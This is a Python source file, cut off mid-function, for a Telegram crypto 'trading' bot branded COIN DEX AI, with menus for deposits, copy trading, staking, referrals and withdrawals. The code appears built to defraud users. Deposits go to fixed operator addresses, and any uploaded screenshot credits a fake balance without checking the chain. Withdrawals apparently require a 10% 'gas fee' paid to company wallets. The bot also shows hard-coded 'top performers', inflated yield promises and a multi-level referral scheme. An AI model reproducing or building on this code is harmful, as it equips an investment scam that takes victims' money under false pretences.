# bot.py - COIN DEX AI - COMPLETE TRADING BOT WITH COMMAND MENU INTERFACE
import aiohttp
import asyncio
from typing import Optional, Dict, Any
import logging
import requests
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, MenuButtonCommands
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, ContextTypes, ConversationHandler, filters
)
from datetime import datetime, timedelta
from config import config
from database import SessionLocal, User, Deposit, CopyTradingConfig, Trade, StakePosition

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ COMMAND MENU SETUP ============
# These commands will appear in the blue "Menu" button
BOT_COMMANDS = [
    BotCommand("start", "🚀 Launch COIN DEX AI"),
    BotCommand("menu", "📋 Show main menu"),
    BotCommand("wallet", "💼 Check balance & deposit"),
    BotCommand("copytrade", "📈 Copy trading dashboard"),
    BotCommand("stake", "🟢 Stake assets & earn"),
    BotCommand("trade", "⚡ Quick trade"),
    BotCommand("positions", "📊 View open positions"),
    BotCommand("history", "📜 Transaction history"),
    BotCommand("settings", "⚙️ Trading settings"),
    BotCommand("referral", "💰 Referral program"),
    BotCommand("support", "🆘 Help & support"),
    BotCommand("deposit", "📥 Deposit funds"),
    BotCommand("withdraw", "📤 Withdraw funds"),
]

# Conversation states - COMPLETE SET (10 states)
(
    ENTER_TRADER_ADDR,           # 0 - For copy trading
    ENTER_CONTRACT_ADDR,          # 1 - For staking memecoins
    ENTER_STAKE_AMOUNT,           # 2 - For staking amount
    ENTER_DEPOSIT_AMOUNT,         # 3 - For deposit amount
    ENTER_DEPOSIT_SCREENSHOT,     # 4 - For deposit screenshot
    ENTER_WITHDRAW_AMOUNT,        # 5 - For withdrawal amount
    ENTER_WITHDRAW_ADDR,          # 6 - For withdrawal address
    ENTER_WITHDRAW_GAS_SCREENSHOT, # 7 - For gas fee screenshot
    ENTER_ALLOCATION,             # 8 - For copy trading allocation
) = range(9)

# Broadcast channel
BROADCAST_CHANNEL = "https://t.me/coindexai"

# Gas fee addresses (company addresses where users pay 10% gas fee)
GAS_FEE_ADDRESSES = {
    'SOL': 'EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg',
    'ETH': '0x7eBb4f696020121394624eEeBD25445f646aB3d3'
}

async def setup_bot_commands(application: Application):
    """Setup command menu that appears in the blue Menu button"""
    await application.bot.set_my_commands(BOT_COMMANDS)
    await application.bot.set_chat_menu_button(menu_button=MenuButtonCommands())
    logger.info("✅ Command menu setup complete")

# ============ COMMAND PROMPT INTERFACE FUNCTIONS ============

async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main menu - Command Prompt Style Interface"""
    user = update.effective_user
    
    # Get user stats
    db = SessionLocal()
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        sol_bal = user_db.total_deposited_sol if user_db else 0.0
        eth_bal = user_db.total_deposited_eth if user_db else 0.0
    finally:
        db.close()
    
    menu_text = f"""
╔══════════════════════════════════════╗
║         📋 MAIN COMMAND MENU         ║
╚══════════════════════════════════════╝

👤 {user.first_name} | 💰 SOL: {sol_bal:.3f} | Ξ ETH: {eth_bal:.4f}

┌──────────────────────────────────────┐
│  🚀 QUICK ACTIONS                    │
├──────────────────────────────────────┤
│  /copytrade  → Start copy trading    │
│  /wallet     → Deposit & withdraw    │
│  /stake      → Earn passive income   │
│  /trade      → Execute trades        │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  📊 PORTFOLIO                        │
├──────────────────────────────────────┤
│  /positions  → View active trades    │
│  /history    → Transaction history   │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  ⚙️ SETTINGS & SUPPORT               │
├──────────────────────────────────────┤
│  /settings   → Trading preferences   │
│  /referral   → Invite & earn         │
│  /support    → Contact help desk     │
└──────────────────────────────────────┘

🔗 Channel: {BROADCAST_CHANNEL}
    """
    
    keyboard = [
        [InlineKeyboardButton("🚀 COPY TRADE", callback_data='copy_trading'), InlineKeyboardButton("💼 WALLET", callback_data='balance')],
        [InlineKeyboardButton("🟢 STAKE ASSETS", callback_data='stake'), InlineKeyboardButton("⚡ QUICK TRADE", callback_data='tools')],
        [InlineKeyboardButton("📊 POSITIONS", callback_data='my_copy_trades'), InlineKeyboardButton("📜 HISTORY", callback_data='portfolio_analytics')],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data='settings'), InlineKeyboardButton("💰 REFERRAL", callback_data='referral')],
        [InlineKeyboardButton("🆘 SUPPORT", callback_data='support')],
    ]
    
    if update.message:
        await update.message.reply_text(menu_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(menu_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wallet command - Shows balance and quick actions"""
    user = update.effective_user
    db = SessionLocal()
    
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        sol_bal = user_db.total_deposited_sol if user_db else 0.0
        eth_bal = user_db.total_deposited_eth if user_db else 0.0
        
        sol_price = get_crypto_price('SOL')
        eth_price = get_crypto_price('ETH')
        
        total_usd = (sol_bal * sol_price) + (eth_bal * eth_price)
        
        wallet_text = f"""
╔══════════════════════════════════════╗
║           💼 WALLET TERMINAL         ║
╚══════════════════════════════════════╝

📍 Address: {user_db.deposit_address if user_db else 'Not generated'}

┌────────── BALANCE ──────────────────┐
│ ◎ SOL:  {sol_bal:>12.4f}  ${sol_bal * sol_price:>10.2f}
│ Ξ ETH:  {eth_bal:>12.4f}  ${eth_bal * eth_price:>10.2f}
├─────────────────────────────────────┤
│ 💵 TOTAL: ${total_usd:>26.2f}
└─────────────────────────────────────┘

⚡ QUICK ACTIONS:
/deposit  → Add funds
/withdraw → Remove funds
/transfer → Send to address
        """
        
        keyboard = [
            [InlineKeyboardButton("📥 DEPOSIT", callback_data='deposit'), InlineKeyboardButton("📤 WITHDRAW", callback_data='withdraw')],
            [InlineKeyboardButton("🔄 REFRESH", callback_data='balance'), InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
        ]
        
        if update.message:
            await update.message.reply_text(wallet_text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.callback_query.edit_message_text(wallet_text, reply_markup=InlineKeyboardMarkup(keyboard))
            
    finally:
        db.close()

async def copytrade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy trading command interface"""
    user = update.effective_user
    db = SessionLocal()
    
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        active_copies = len(user_db.copy_trading_configs) if user_db and hasattr(user_db, 'copy_trading_configs') else 0
        
        copy_text = f"""
╔══════════════════════════════════════╗
║        📈 COPY TRADE TERMINAL        ║
╚══════════════════════════════════════╝

👤 Trader: {user.first_name}
📊 Active Copies: {active_copies}

┌──────────────────────────────────────┐
│  🎯 HOW IT WORKS                     │
├──────────────────────────────────────┤
│  1. Find profitable trader           │
│  2. Add their wallet address         │
│  3. Set allocation %                 │
│  4. Auto-mirror trades               │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  📈 TOP PERFORMERS                   │
├──────────────────────────────────────┤
│  🥇 @WhaleTrader    +45% (24h)       │
│  🥈 @SolanaKing     +32% (24h)       │
│  🥉 @MemeMaster     +28% (24h)       │
└──────────────────────────────────────┘

⚡ COMMANDS:
/addtrader  → Copy new wallet
/mytrades   → View copied trades
/stopcopy   → Stop copying
        """
        
        keyboard = [
            [InlineKeyboardButton("➕ ADD TRADER", callback_data='add_copy_trader'), InlineKeyboardButton("📊 MY TRADES", callback_data='my_copy_trades')],
            [InlineKeyboardButton("⚙️ SETTINGS", callback_data='copy_settings'), InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
        ]
        
        if update.message:
            await update.message.reply_text(copy_text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.callback_query.edit_message_text(copy_text, reply_markup=InlineKeyboardMarkup(keyboard))
            
    finally:
        db.close()

async def stake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Staking command interface"""
    stake_text = """
╔══════════════════════════════════════╗
║         🟢 STAKING TERMINAL          ║
╚══════════════════════════════════════╝

┌──────────────────────────────────────┐
│  💰 STAKING OPTIONS                  │
├──────────────────────────────────────┤
│  ◎ SOL  →  6-8% APY (Flexible)       │
│  Ξ ETH  →  4-5% APY (30-day lock)    │
│  🪙 MEME → Up to 100%+ APY           │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  📊 YOUR POSITIONS                   │
├──────────────────────────────────────┤
│  View active stakes and rewards      │
│  Auto-compound enabled               │
└──────────────────────────────────────┘

⚡ COMMANDS:
/stakesol   → Stake Solana
/stakeeth   → Stake Ethereum
/stakememe  → Stake memecoin
/mystakes   → View positions
/unstake    → Remove stake
    """
    
    keyboard = [
        [InlineKeyboardButton("◎ STAKE SOL", callback_data='stake_SOL'), InlineKeyboardButton("Ξ STAKE ETH", callback_data='stake_ETH')],
        [InlineKeyboardButton("🪙 STAKE MEME", callback_data='stake_meme'), InlineKeyboardButton("📊 MY STAKES", callback_data='my_stakes')],
        [InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(stake_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(stake_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick trade command"""
    trade_text = """
╔══════════════════════════════════════╗
║         ⚡ QUICK TRADE TERMINAL      ║
╚══════════════════════════════════════╝

┌──────────────────────────────────────┐
│  🔄 INSTANT SWAP                     │
├──────────────────────────────────────┤
│  • Best rates via Jupiter/1inch      │
│  • Slippage protection               │
│  • MEV protection                    │
└──────────────────────────────────────┘

💡 Type: /buy <token> <amount>
    or: /sell <token> <amount>

Examples:
/buy SOL 10
/sell ETH 0.5
/buy BONK 1000000
    """
    
    keyboard = [
        [InlineKeyboardButton("◎ BUY SOL", callback_data='stake_SOL'), InlineKeyboardButton("Ξ BUY ETH", callback_data='stake_ETH')],
        [InlineKeyboardButton("🪙 CUSTOM TOKEN", callback_data='stake_meme'), InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(trade_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(trade_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View open positions"""
    user = update.effective_user
    db = SessionLocal()
    
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        
        if not user_db:
            positions_text = """
╔══════════════════════════════════════╗
║         📊 POSITIONS TERMINAL        ║
╚══════════════════════════════════════╝

❌ No active positions found.

Use /copytrade or /trade to start.
            """
        else:
            trades = db.query(Trade).filter_by(user_id=user_db.id).order_by(Trade.created_at.desc()).limit(5).all()
            
            if not trades:
                positions_text = """
╔══════════════════════════════════════╗
║         📊 POSITIONS TERMINAL        ║
╚══════════════════════════════════════╝

📭 No open positions.

Start trading to see positions here.
                """
            else:
                trade_lines = []
                for t in trades:
                    emoji = "🟢" if t.side == 'BUY' else "🔴"
                    trade_lines.append(f"{emoji} {t.symbol}: {t.quantity:.4f} @ ${t.price:.2f}")
                
                positions_text = f"""
╔══════════════════════════════════════╗
║         📊 POSITIONS TERMINAL        ║
╚══════════════════════════════════════╝

📈 RECENT ACTIVITY:
{chr(10).join(trade_lines)}

💡 Use /history for full log
                """
        
        keyboard = [
            [InlineKeyboardButton("🔄 REFRESH", callback_data='my_copy_trades'), InlineKeyboardButton("📜 HISTORY", callback_data='portfolio_analytics')],
            [InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
        ]
        
        if update.message:
            await update.message.reply_text(positions_text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.callback_query.edit_message_text(positions_text, reply_markup=InlineKeyboardMarkup(keyboard))
            
    finally:
        db.close()

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Transaction history"""
    history_text = """
╔══════════════════════════════════════╗
║      📜 TRANSACTION HISTORY          ║
╚══════════════════════════════════════╝

┌──────────────────────────────────────┐
│  📝 RECENT TRANSACTIONS              │
├──────────────────────────────────────┤
│  No recent transactions              │
│                                      │
│  Use /wallet to deposit and          │
│  start trading.                      │
└──────────────────────────────────────┘

📊 Export: /exportcsv
🔍 Details: /tx <id>
    """
    
    keyboard = [
        [InlineKeyboardButton("📤 EXPORT CSV", callback_data='export_csv'), InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(history_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(history_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Settings interface"""
    settings_text = """
╔══════════════════════════════════════╗
║      ⚙️ SETTINGS TERMINAL            ║
╚══════════════════════════════════════╝

┌──────────────────────────────────────┐
│  🔧 TRADING PREFERENCES              │
├──────────────────────────────────────┤
│  Slippage: 1%                        │
│  Gas Priority: Standard              │
│  Auto-Approve: OFF                   │
│  Notifications: ON                   │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  🔒 SECURITY                         │
├──────────────────────────────────────┤
│  2FA: Disabled                       │
│  Withdrawal Confirm: ON              │
│  Login Alerts: ON                    │
└──────────────────────────────────────┘

⚡ COMMANDS:
/slippage <0.5-5>
/gas <slow/standard/fast>
/2fa <on/off>
    """
    
    keyboard = [
        [InlineKeyboardButton("🔧 TRADING", callback_data='tools'), InlineKeyboardButton("🔒 SECURITY", callback_data='support')],
        [InlineKeyboardButton("🔔 NOTIFICATIONS", callback_data='price_alerts'), InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(settings_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(settings_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referral program"""
    user = update.effective_user
    bot_username = context.bot.username
    referral_link = f"https://t.me/{bot_username}?start={user.id}"
    
    ref_text = f"""
╔══════════════════════════════════════╗
║       💰 REFERRAL TERMINAL           ║
╚══════════════════════════════════════╝

🔗 YOUR LINK:
{referral_link}

┌──────────────────────────────────────┐
│  💵 COMMISSION STRUCTURE             │
├──────────────────────────────────────┤
│  Level 1 (Direct): 10%               │
│  Level 2:          5%                │
│  Level 3:          2%                │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  📊 YOUR STATS                       │
├──────────────────────────────────────┤
│  Total Referrals: 0                  │
│  Active Traders: 0                   │
│  Total Earned: 0.00 USDT             │
│  Available: 0.00 USDT                │
└──────────────────────────────────────┘
    """
    
    keyboard = [
        [InlineKeyboardButton("📤 SHARE LINK", url=f"https://t.me/share/url?url={referral_link}&text=Join%20COIN%20DEX%20AI!")],
        [InlineKeyboardButton("📊 MY REFERRALS", callback_data='my_referrals'), InlineKeyboardButton("💵 CLAIM", callback_data='claim_ref')],
        [InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(ref_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(ref_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support center"""
    support_text = """
╔══════════════════════════════════════╗
║        🆘 SUPPORT TERMINAL           ║
╚══════════════════════════════════════╝

┌──────────────────────────────────────┐
│  📞 CONTACT                          │
├──────────────────────────────────────┤
│  @coindex_support                    │
│  support@coindexai.com               │
│                                      │
│  ⏰ Response Time: < 2 hours         │
└──────────────────────────────────────┘

┌──────────────────────────────────────┐
│  📚 RESOURCES                        │
├──────────────────────────────────────┤
│  /guide     → User guide             │
│  /faq       → Common questions       │
│  /security  → Security tips          │
│  /status    → System status          │
└──────────────────────────────────────┘
    """
    
    keyboard = [
        [InlineKeyboardButton("💬 CONTACT SUPPORT", url="https://t.me/coindex_support")],
        [InlineKeyboardButton("📚 GUIDE", callback_data='guidelines'), InlineKeyboardButton("❓ FAQ", callback_data='support')],
        [InlineKeyboardButton("📋 MENU", callback_data='back_menu')],
    ]
    
    if update.message:
        await update.message.reply_text(support_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(support_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deposit command"""
    keyboard = [
        [InlineKeyboardButton("◎ SOL", callback_data='select_deposit_SOL')],
        [InlineKeyboardButton("Ξ ETH", callback_data='select_deposit_ETH')],
        [InlineKeyboardButton("💵 USDT", callback_data='select_deposit_USDT_ETH')],
        [InlineKeyboardButton("💵 USDC", callback_data='select_deposit_USDC_SOL')],
        [InlineKeyboardButton("↩️ BACK", callback_data='balance')],
    ]
    
    deposit_text = """
╔══════════════════════════════════════╗
║         📥 DEPOSIT TERMINAL          ║
╚══════════════════════════════════════╝

Select currency to deposit:
    """
    
    if update.message:
        await update.message.reply_text(deposit_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(deposit_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Withdraw command"""
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        if not user or (user.total_deposited_sol == 0 and user.total_deposited_eth == 0):
            await update.message.reply_text(
                "❌ No funds available. Deposit first.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 DEPOSIT", callback_data='deposit')]])
            )
            return
        
        sol_bal = user.total_deposited_sol
        eth_bal = user.total_deposited_eth
        
        keyboard = []
        if sol_bal > 0.05:
            keyboard.append([InlineKeyboardButton(f"◎ WITHDRAW SOL ({sol_bal:.4f})", callback_data='withdraw_start_SOL')])
        if eth_bal > 0.005:
            keyboard.append([InlineKeyboardButton(f"Ξ WITHDRAW ETH ({eth_bal:.4f})", callback_data='withdraw_start_ETH')])
        keyboard.append([InlineKeyboardButton("↩️ BACK", callback_data='balance')])
        
        message = f"""
╔══════════════════════════════════════╗
║        📤 WITHDRAWAL TERMINAL        ║
╚══════════════════════════════════════╝

💰 AVAILABLE:
◎ SOL: {sol_bal:.4f}
Ξ ETH: {eth_bal:.4f}

Select currency:
        """
        
        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
        
    finally:
        db.close()

# ============ WELCOME & GUIDELINES ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with guidelines"""
    user = update.effective_user
    
    welcome_text = f"""
🤖 *Welcome to COIN DEX AI*

Hello {user.first_name}! Your professional DeFi trading companion.

📋 *GUIDELINES:*

1️⃣ *Deposit Funds*
   • Send SOL/ETH/USDT to your unique deposit address
   • Minimum: 0.5 SOL or 0.05 ETH
   • Funds are secured in your personal trading wallet

2️⃣ *Copy Trading*
   • Enter any successful trader's wallet address
   • Bot automatically copies their trades in real-time
   • Set your investment allocation (10-100%)

3️⃣ *Stake Assets*
   • Stake SOL, ETH, or any memecoin
   • Enter contract address for custom tokens
   • Earn passive income (APY varies)

4️⃣ *Tools*
   • Price alerts & notifications
   • Portfolio analytics
   • Risk management settings

5️⃣ *Security*
   • Your keys, your crypto
   • 2FA protection available
   • 24/7 monitoring

🔗 *Join our community:* {BROADCAST_CHANNEL}

*Select an option below to get started:*
    """
    
    keyboard = [
        [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("🟢 Stake Assets", callback_data='stake'), InlineKeyboardButton("💼 Wallet", callback_data='balance')],
        [InlineKeyboardButton("🛠 Tools", callback_data='tools')],
        [InlineKeyboardButton("💰 Referral", callback_data='referral'), InlineKeyboardButton("📈 Copy Trading", callback_data='copy_trading')],
        [InlineKeyboardButton("📢 Join Channel", url=BROADCAST_CHANNEL), InlineKeyboardButton("🤝 Support", callback_data='support')]
    ]
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def guidelines(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed guidelines"""
    text = """
📚 *COIN DEX AI - Complete Guide*

*Getting Started:*
1. Click "📥 Deposit" to fund your account
2. Choose SOL, ETH, or USDT
3. Send minimum amount to activate
4. Wait for blockchain confirmation

*Copy Trading:*
• Find successful traders on DexScreener or Birdeye
• Copy their wallet address
• Paste in "📈 Copy Trading"
• Set your allocation percentage
• Bot mirrors their trades automatically

*Staking:*
• Stake SOL/ETH for 6-8% APY
• For memecoins: enter contract address
• Lock period: Flexible or 30/60/90 days
• Rewards auto-compound

*Tools Available:*
• Real-time price alerts
• P&L tracking
• Risk calculator
• Gas fee optimizer

*Need help?* Contact @coindex_support
    """
    
    keyboard = [[InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]]
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ ENHANCED DEPOSIT SECTION WITH LIVE PRICES ============

async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deposit options with amount selection"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ SOL", callback_data='select_deposit_SOL')],
        [InlineKeyboardButton("Ξ ETH", callback_data='select_deposit_ETH')],
        [InlineKeyboardButton("💵 USDT (ERC-20)", callback_data='select_deposit_USDT_ETH')],
        [InlineKeyboardButton("💵 USDC (SPL)", callback_data='select_deposit_USDC_SOL')],
        [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        "📥 *Deposit Funds*\n\nSelect cryptocurrency to deposit to your COIN DEX AI wallet:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def get_crypto_prices() -> dict:
    """Fetch live crypto prices from CoinGecko API"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum,tether,usd-coin&vs_currencies=usd',
                timeout=10
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        'SOL': data.get('solana', {}).get('usd', 88.50),
                        'ETH': data.get('ethereum', {}).get('usd', 3500.00),
                        'USDT': data.get('tether', {}).get('usd', 1.00),
                        'USDC': data.get('usd-coin', {}).get('usd', 1.00)
                    }
                else:
                    return {'SOL': 88.50, 'ETH': 3500.00, 'USDT': 1.00, 'USDC': 1.00}
    except Exception as e:
        logger.error(f"Error fetching live prices: {e}")
        return {'SOL': 88.50, 'ETH': 3500.00, 'USDT': 1.00, 'USDC': 1.00}


async def select_deposit_currency(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle currency selection and show LIVE current price"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('select_deposit_', '')
    context.user_data['deposit_currency'] = currency
    
    prices = await get_crypto_prices()
    
    if currency == 'SOL':
        price = prices.get('SOL', 88.50)
        min_deposit = 0.5
        message = f"""
📥 *Deposit Solana (SOL)*

*💰 LIVE Price:* ${price:.2f} USD per SOL
*Minimum Deposit:* {min_deposit} SOL (${min_deposit * price:.2f})

Please enter the amount of SOL you want to deposit:

*Example:* `2.5` for 2.5 SOL (~${2.5 * price:.2f})

_Type the amount below:_
        """
    elif currency == 'ETH':
        price = prices.get('ETH', 3500.00)
        min_deposit = 0.05
        message = f"""
📥 *Deposit Ethereum (ETH)*

*💰 LIVE Price:* ${price:.2f} USD per ETH
*Minimum Deposit:* {min_deposit} ETH (${min_deposit * price:.2f})

Please enter the amount of ETH you want to deposit:

*Example:* `0.1` for 0.1 ETH (~${0.1 * price:.2f})

_Type the amount below:_
        """
    elif 'USDT' in currency:
        message = f"""
📥 *Deposit USDT (ERC-20)*

*💰 Fixed Price:* $1.00 USD per USDT
*Minimum Deposit:* 10 USDT

Please enter the amount of USDT you want to deposit:

*Example:* `100` for 100 USDT ($100.00)

_Type the amount below:_
        """
    else:
        message = f"""
📥 *Deposit USDC (SPL)*

*💰 Fixed Price:* $1.00 USD per USDC
*Minimum Deposit:* 10 USDC

Please enter the amount of USDC you want to deposit:

*Example:* `100` for 100 USDC ($100.00)

_Type the amount below:_
        """
    
    await query.edit_message_text(message, parse_mode='Markdown')
    return ENTER_DEPOSIT_AMOUNT


async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process deposit amount and show address, request screenshot"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid positive number.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='deposit')]])
        )
        return ConversationHandler.END
    
    currency = context.user_data.get('deposit_currency', 'SOL')
    context.user_data['expected_deposit_amount'] = amount
    
    min_amounts = {'SOL': 0.5, 'ETH': 0.05, 'USDT_ETH': 10, 'USDC_SOL': 10}
    if amount < min_amounts.get(currency, 0.5):
        await update.message.reply_text(
            f"❌ Minimum deposit is {min_amounts[currency]} {currency.split('_')[0]}. Please try again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'select_deposit_{currency}')]])
        )
        return ConversationHandler.END
    
    prices = await get_crypto_prices()
    if currency == 'SOL':
        usd_value = amount * prices.get('SOL', 88.50)
    elif currency == 'ETH':
        usd_value = amount * prices.get('ETH', 3500.00)
    else:
        usd_value = amount
    
    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
    
    names = {
        'SOL': 'Solana (SOL)', 
        'ETH': 'Ethereum (ETH)', 
        'USDT_ETH': 'Tether (USDT - ERC20)',
        'USDC_SOL': 'USD Coin (USDC - SPL)'
    }
    
    message = f"""
💰 *Deposit Details Confirmed*

*Amount to Deposit:* {amount:.4f} {currency.split('_')[0]}
*USD Value:* ~${usd_value:.2f}
*Currency:* {names.get(currency, currency)}

*Send to this address:*
`{address}`

⚠️ *CRITICAL INSTRUCTIONS:*
• Send *ONLY* {names.get(currency, currency)}
• Wrong network = Permanent loss
• Send *exactly* {amount} {currency.split('_')[0]}

*After sending:*
1️⃣ Wait for blockchain confirmation
2️⃣ Take a screenshot of the transaction
3️⃣ Click "📸 Submit Screenshot" below

*Admin will verify and credit your balance*
    """
    
    keyboard = [
        [InlineKeyboardButton("📸 Submit Screenshot", callback_data='submit_deposit_screenshot')],
        [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_addr_{currency}')],
        [InlineKeyboardButton("🔄 Refresh Price", callback_data=f'select_deposit_{currency}')],
        [InlineKeyboardButton("↩️ Back", callback_data='deposit')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return ConversationHandler.END


async def request_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Request screenshot of deposit transaction"""
    query = update.callback_query
    await query.answer()
    
    currency = context.user_data.get('deposit_currency', 'SOL')
    amount = context.user_data.get('expected_deposit_amount', 0)
    
    await query.edit_message_text(
        f"""
📸 *Submit Deposit Screenshot*

Please upload a screenshot showing:
• Transaction ID (TXID/Signature)
• Amount sent: {amount:.4f} {currency}
• Destination address
• Confirmation status

*Requirements:*
• Screenshot must clearly show transaction details
• Amount should match {amount:.4f} {currency}
• Must be sent to the correct deposit address

_Send the screenshot now:_
        """,
        parse_mode='Markdown'
    )
    return ENTER_DEPOSIT_SCREENSHOT


async def process_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process deposit screenshot - Add to virtual balance"""
    user = update.effective_user
    
    if not update.message.photo:
        await update.message.reply_text(
            "❌ Please send a screenshot/image of your deposit transaction.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='submit_deposit_screenshot')]])
        )
        return ENTER_DEPOSIT_SCREENSHOT
    
    currency = context.user_data.get('deposit_currency', 'SOL')
    amount = context.user_data.get('expected_deposit_amount', 0)
    photo = update.message.photo[-1]
    context.user_data['deposit_screenshot_id'] = photo.file_id
    
    db = SessionLocal()
    
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        if not user_db:
            user_db = User(telegram_id=user.id, username=user.username)
            db.add(user_db)
            db.commit()
        
        deposit = Deposit(
            user_id=user_db.id,
            from_address='User_Deposit',
            to_address=config.DEPOSIT_ADDRESSES.get(currency, 'Unknown'),
            amount=amount,
            currency=currency.split('_')[0],
            tx_signature='PENDING_VERIFICATION',
            status='confirmed',
            confirmed_at=datetime.utcnow()
        )
        db.add(deposit)
        
        if currency == 'SOL':
            user_db.total_deposited_sol += amount
        elif currency == 'ETH':
            user_db.total_deposited_eth += amount
        
        db.commit()
        
        prices = await get_crypto_prices()
        usd_value = amount * prices.get(currency.split('_')[0], 0)
        
        await update.message.reply_text(
            f"""
✅ *DEPOSIT CONFIRMED - BALANCE CREDITED!*

*Deposit Details:*
• Amount: {amount:.4f} {currency.split('_')[0]}
• USD Value: ~${usd_value:.2f}
• Status: ✅ Credited to Balance

*Your Updated Balance:*
◎ SOL: {user_db.total_deposited_sol:.4f}
